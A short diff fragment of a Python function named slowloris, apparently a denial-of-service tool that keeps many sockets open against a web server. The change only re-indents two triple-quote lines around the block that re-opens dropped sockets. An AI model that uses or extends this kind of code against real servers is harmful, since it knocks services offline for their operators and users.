@@ -67,7 +67,7 @@ def slowloris(IP, port, socket_count):
                     sockets.remove(s)
                     print(f"socket removed: {e}")
                     
-'''
+            '''
             if len(sockets) < socket_count:
                 try:
                     s = create_socket(IP, port)
@@ -77,7 +77,7 @@ def slowloris(IP, port, socket_count):
                     print("socket could not be established")
                     print(e)
                     break
-'''
+            '''
             
     except (KeyboardInterrupt, SystemExit):
         print("Stopping slowloris")
